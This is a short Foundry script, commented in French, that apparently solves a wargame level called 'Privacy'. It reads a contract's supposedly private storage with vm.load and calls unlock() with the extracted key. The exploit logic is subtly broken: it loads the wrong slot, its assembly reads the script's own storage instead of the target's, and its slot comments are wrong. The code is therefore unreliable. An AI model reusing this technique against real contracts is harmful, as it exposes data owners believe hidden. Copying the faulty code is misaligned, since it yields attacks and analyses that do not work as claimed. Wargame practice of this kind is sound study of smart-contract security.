// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Privacy.sol";

contract UnlockPrivacy is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address privacyContractAddress = vm.envAddress("CONTRACT_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // Lecture du storage de Privacy
        bytes32 slot0 = vm.load(privacyContractAddress, bytes32(uint256(2))); // Lecture du slot 2 qui contient bytes32[3] private data;
        bytes32[3] memory data;
        assembly {
            mstore(data, slot0) // Copie slot0 dans data[0]
            mstore(add(data, 0x20), sload(add(slot0, 1))) // Copie slot3 (data[1])
            mstore(add(data, 0x40), sload(add(slot0, 2))) // Copie slot6 (data[2])
        }

        // Extraction de la clé et déverrouillage
        bytes16 key = bytes16(data[2]);
        console.log("Unlocking Privacy contract with key:", vm.toString(key)); 

      
        Privacy(privacyContractAddress).unlock(key);
        console.log("Privacy contract unlocked!");

        vm.stopBroadcast();
    }
}
